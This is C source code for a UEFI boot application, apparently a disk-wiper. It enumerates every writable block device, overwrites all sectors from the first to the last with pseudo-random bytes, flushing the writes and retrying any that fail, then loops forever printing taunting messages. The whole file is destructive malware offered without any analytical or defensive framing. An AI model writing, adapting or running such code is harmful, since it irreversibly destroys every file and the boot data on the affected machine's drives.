#include <stdint.h>
#include <stddef.h>
#include <efi.h>
#include <efilib.h>

#define LCG_A 1664525
#define LCG_C 1013904223
#define LCG_M 4294967296ULL
#define SAFE_BATCH_BLOCKS 8
#define MAX_BLOCK_SIZE 4096
#define MAX_BUFFER_SIZE (SAFE_BATCH_BLOCKS * MAX_BLOCK_SIZE)

static SIMPLE_TEXT_OUTPUT_INTERFACE *ConOut = NULL;

UINT64 lcg_seed = 1;

UINT64 lcg_rand() {
    lcg_seed = (lcg_seed * LCG_A + LCG_C) % LCG_M;
    return lcg_seed;
}

EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    ST = SystemTable;
    BS = SystemTable->BootServices;
    ConOut = SystemTable->ConOut;

    EFI_STATUS Status;
    EFI_BLOCK_IO_PROTOCOL *BlockIo = NULL;
    EFI_HANDLE *HandleBuffer = NULL;
    UINTN HandleCount = 0;
    UINT8 *Buffer = NULL;

    Status = BS->AllocatePool(EfiBootServicesData, MAX_BUFFER_SIZE, (void **)&Buffer);
    if (EFI_ERROR(Status)) {
        return Status;
    }

    Status = BS->LocateHandleBuffer(
        ByProtocol,
        &gEfiBlockIoProtocolGuid,
        NULL,
        &HandleCount,
        &HandleBuffer
    );
    if (EFI_ERROR(Status)) {
        BS->FreePool(Buffer);
        return Status;
    }

    for (UINTN i = 0; i < HandleCount; i++) {
        BlockIo = NULL;
        Status = BS->OpenProtocol(
            HandleBuffer[i],
            &gEfiBlockIoProtocolGuid,
            (void **)&BlockIo,
            ImageHandle,
            NULL,
            EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL
        );
        if (EFI_ERROR(Status) || BlockIo == NULL) {
            continue;
        }

        UINTN BlockSize = BlockIo->Media->BlockSize;
        EFI_LBA LastBlock = BlockIo->Media->LastBlock;

        if (BlockIo->Media->MediaPresent == FALSE || BlockIo->Media->ReadOnly == TRUE || BlockSize > MAX_BLOCK_SIZE) {
            BS->CloseProtocol(HandleBuffer[i], &gEfiBlockIoProtocolGuid, ImageHandle, NULL);
            continue;
        }

        UINTN WriteFailures = 0;
        for (EFI_LBA Lba = 0; Lba <= LastBlock; Lba += SAFE_BATCH_BLOCKS) {
            UINTN BlocksToWrite = SAFE_BATCH_BLOCKS;
            UINTN BytesToWrite = SAFE_BATCH_BLOCKS * BlockSize;
            if (Lba + SAFE_BATCH_BLOCKS > LastBlock) {
                BlocksToWrite = (UINTN)(LastBlock - Lba + 1);
                BytesToWrite = BlocksToWrite * BlockSize;
            }

            for (UINTN j = 0; j < BytesToWrite; j++) {
                Buffer[j] = (UINT8)(lcg_rand() % 256);
            }

            for (UINTN retry = 0; retry < 5; retry++) {
                Status = BlockIo->WriteBlocks(BlockIo, BlockIo->Media->MediaId, Lba, BytesToWrite, Buffer);
                if (!EFI_ERROR(Status)) {
                    break;
                }
                if (retry == 4) {
                    WriteFailures++;
                }
            }

            if (EFI_ERROR(Status)) {
                if (WriteFailures > 10) {
                    break;
                }
            } else {
                Status = BlockIo->FlushBlocks(BlockIo);
                if (EFI_ERROR(Status)) {

                }
            }
        }
        BS->CloseProtocol(HandleBuffer[i], &gEfiBlockIoProtocolGuid, ImageHandle, NULL);
    }


    if (HandleBuffer) {
        BS->FreePool(HandleBuffer);
    }
    if (Buffer) {
        BS->FreePool(Buffer);
    }


    ConOut->ClearScreen(ConOut);
    ConOut->SetAttribute(ConOut, EFI_LIGHTGRAY | EFI_BACKGROUND_BLACK);


    for (;;) {
        Print(L"This is my world without you, bro. Empty. T-T\n");
        Print(L"Stay with me or you will not see me again forever.\n");

        BS->Stall(500000);
    }


    return EFI_SUCCESS;
}
